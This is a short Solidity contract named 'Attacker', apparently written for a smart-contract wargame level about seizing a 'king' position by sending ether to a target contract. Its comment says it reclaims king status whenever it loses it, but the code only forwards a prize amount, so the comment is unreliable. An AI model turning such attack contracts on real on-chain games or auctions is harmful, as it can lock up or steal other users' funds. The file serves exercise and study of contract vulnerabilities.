// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Attacker {
    address payable public king;

    event BecomeKing(uint256 ethSent);

    constructor(address _king) {
        king = payable(_king);
    }

    // Whenever Attacker loses king status, reclaim it
    function becomeKing(uint _prize) external payable returns(bool) {
        (bool success, ) = king.call{value: _prize}("");

        emit BecomeKing(_prize);
        return success;
    }
}